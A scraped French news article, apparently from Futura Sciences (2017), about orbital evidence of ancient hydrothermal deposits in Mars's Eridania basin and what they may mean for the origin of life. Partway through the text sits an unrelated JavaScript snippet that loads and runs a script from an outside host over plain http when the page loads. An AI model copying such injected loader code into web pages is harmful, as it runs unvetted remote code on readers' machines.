{"title": "Mars : de potentiels anciens berceaux de vie détectés ?", "newspaper": "Futura Sciences", "author": "Xavier Demeersman", "date_publi": "10/10/2017", "content": "Comme nous l'a appris ces dernières années le rover Curiosity, Mars était habitable moins de 800 millions d'années après sa naissance. Des chercheurs pensent avoir découvert de possibles berceaux de la vie sur un des plus anciens sites martiens. Ce qu'il faut retenir Une équipe de chercheurs interprète des données collectées par la sonde MRO sur un site martien très ancien comme le vestige d’une source hydrothermale au fond d’une mer. Ce type d’environnement étant un bon candidat pour l'apparition de la vie terrestre, le site est une possible fenêtre sur l’enfance de la Terre. Une équipe de chercheurs qui s'est penchée sur les observations des sols martiens réalisées avec la sonde MRO ( Mars Reconnaissance Orbiter ) estime avoir mis la main sur des dépôts attestant d'une  activité hydrothermale  au fond d'une ancienne mer. De nouveaux indices, en somme, que la Planète rouge était jadis habitable, à l'instar de sa voisine la  Terre , à la même période. Il s'agit peut-être d'un berceau de forme de vie martienne. Voir aussi : Les plus vieilles traces de vie trouvées au Labrador ? Avec environ 210.000 km 3 , selon leurs calculs, cette mer, située dans le  bassin  d'Eridania ( hémisphère sud  de Mars), aurait contenu autant d'eau que tous les autres anciens lacs martiens réunis. Selon les chercheurs, elle était déjà en place il y a 3,7 milliards d'années , ce qui en fait aujourd'hui le plus ancien vestige exposé de la  croûte  martienne. Les traces importantes de  serpentine , talc et carbonate révélées par l'instrument Crism ( Compact Reconnaissance Spectrometer for Mars ), de même que  « la forme et la  texture  de l'épaisse couche rocheuse »  ( dixit  la Nasa), laissent penser que le site était jadis une source chaude sur le  plancher  de cette mer. Y a-t-il eu de la vie ? Pour l'instant, personne ne peut le dire — il faudrait aller sur place pour le découvrir — mais comme des scientifiques soupçonnent que la  vie sur Terre  a pu commencer dans ce type d'environnement, il est donc possible que cela fût aussi le cas sur Mars.  « Ce site peut nous parler du type d'environnement où la  vie  a commencé sur Terre , commente Paul Niles, du  Johnson Space Center  de la Nasa.  L'activité volcanique combinée à de l'eau stagnante a fourni des conditions qui étaient probablement similaires aux conditions qui existaient sur la Terre à peu près au même moment » , explique le chercheur. Le bassin d’Eridania dans l’hémisphère sud de Mars. Sur cette vue, large de 20 km, prise par la sonde MRO, l'instrument Crism distingue divers éléments interprétés comme les traces d’une ancienne activité hydrothermale, et partiellement recouverts de dépôts volcaniques. © Nasa, JPL-Caltech, MSSS                               Mars offrirait une fenêtre sur l’apparition de la vie sur Terre Sur Mars, les eaux stagnantes ont disparu et le  volcanisme  semble avoir quasiment cessé. Son  atmosphère  s'est érodée et elle est devenue un monde froid et sec. Tout s'est plus ou moins figé, laissant ainsi en place de nombreuses traces de son passé. En revanche sur Terre, planète plus grande, plus chaude et humide, l' activité tectonique  a effacé au fil des milliards d'années presque toute trace de son enfance. Aussi,  Mars  constitue-t-elle un champ d'investigation important quant à la question de l'apparition de la vie, comme le notent les chercheurs.  « Les anciens dépôts hydrothermaux en eaux profondes du bassin d'Eridania représentent une nouvelle catégorie de cible astrobiologique sur Mars , indique le rapport.  [Ils] ne sont pas seulement intéressants pour l'exploration de Mars : ils représentent une  fenêtre  sur le début de la Terre. »   ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Voir aussi : Océans extraterrestres : la Nasa confirme qu'il y a de l'énergie pour la vie sur Encelade Sans oublier non plus, ne serait-ce que dans notre  Système solaire , d'autres mondes au fond des océans desquels l'activité volcanique dans la croûte offre des conditions où la vie a pu — ou pourrait — se développer. Ils sont au moins deux : Europe, satellite de  Jupiter , et  Encelade , satellite de  Saturne . Bien qu'éloignés du  Soleil , les vastes océans d'eau  liquide  qu'ils renferment sous une  coquille  de glace sont actuellement considérés comme potentiellement habitables. Comme le rappelle Paul Niles, qui a cosigné cette étude publiée dans  Nature Communications ,  « la vie n'a pas besoin d'une atmosphère agréable ou d'une surface tempérée, mais seulement de roches, de  chaleur  et d'eau » .  Des sources hydrothermales océaniques entourées de vers géants                       On voit dans cette vidéo des sources hydrothermales trouvées sur la dorsale est pacifique. Elles sont entourées de colonies des fameux vers géants appelés Riftia pachyptila.                                       ", "theme": "sciences"}